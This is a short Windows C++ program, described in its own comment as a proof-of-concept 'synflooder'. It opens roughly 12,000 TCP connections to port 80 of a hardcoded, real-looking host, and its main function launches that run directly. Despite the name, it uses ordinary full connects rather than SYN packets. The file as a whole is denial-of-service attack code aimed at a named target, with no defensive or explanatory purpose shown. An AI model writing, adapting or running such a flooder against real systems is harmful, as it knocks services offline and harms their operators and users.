/* 
 * File:   main.cpp
 * Author: moi
 *
 * Created on 31 de mayo de 2010, 17:47
 */

#include <stdlib.h>
#include <stdio.h>
#include <winsock.h>

/*
 * prof of concept synflooder
 * */

#define PORT 80
#define MAX_CLIENTS_PER_SOCKET 12000

void synflood_attack(const char * host)
{
      WORD pResultWordVersion = MAKEWORD(2,1);
      WSAData pData;
      int pResult = WSAStartup(pResultWordVersion,&pData);
      if ( pResult != -1 ){
          printf("%s","Initialized socket subsystem\n");
      }

      struct hostent * hosts;
      hosts = gethostbyname(host);
      if ( hosts != NULL ){
          printf("%s","Encontrado...inicializando..\n");
          struct sockaddr_in socks[MAX_CLIENTS_PER_SOCKET];
          SOCKET pSocket[MAX_CLIENTS_PER_SOCKET];

          int number_of_clients = sizeof(pSocket) / sizeof(SOCKET);

          int i;
          for ( i = 0; i < (number_of_clients - 1); i++)
          {
                socks[i].sin_family = AF_INET;
                socks[i].sin_port = htons(PORT);
                socks[i].sin_addr.s_addr = *(unsigned long*)hosts->h_addr_list[0];
                pSocket[i] = socket(AF_INET,SOCK_STREAM,0);

                if ( connect(pSocket[i],(struct sockaddr*)&socks[i],sizeof(struct sockaddr)) != -1 ){
                    printf("%s","Conectado....\n");
                }else{
                    printf("%s","Error..\n");
                }
          }
      }
}

int main(){
    synflood_attack("apsq.dom.do");
}
